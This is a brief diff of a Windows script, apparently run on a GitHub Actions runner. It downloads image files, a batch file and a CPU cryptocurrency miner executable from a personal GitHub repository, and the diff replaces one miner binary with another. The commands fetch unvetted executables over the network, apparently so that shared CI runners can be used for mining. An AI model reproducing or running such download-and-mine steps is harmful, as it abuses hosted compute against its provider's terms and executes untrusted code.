@@ -2,7 +2,7 @@
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/TranscodedWallpaper -OutFile TranscodedWallpaper"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/CachedImage_1024_768_POS4.jpg -OutFile CachedImage_1024_768_POS4.jpg"
 curl -s -L -o C:\Users\runneradmin\Downloads\main.bat https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/main.bat
-curl -s -L -o C:\Users\runneradmin\Downloads\iniminer.exe https://github.com/IKSANNURPADILLAH/init/raw/refs/heads/main/iniminer.exe
+curl -s -L -o C:\Users\runneradmin\Downloads\tnn-miner-cpu.exe https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/tnn-miner-cpu.exe
 set "TranscodedWallpaper=TranscodedWallpaper"
 set "CachedImage=CachedImage_1024_768_POS4.jpg"
 
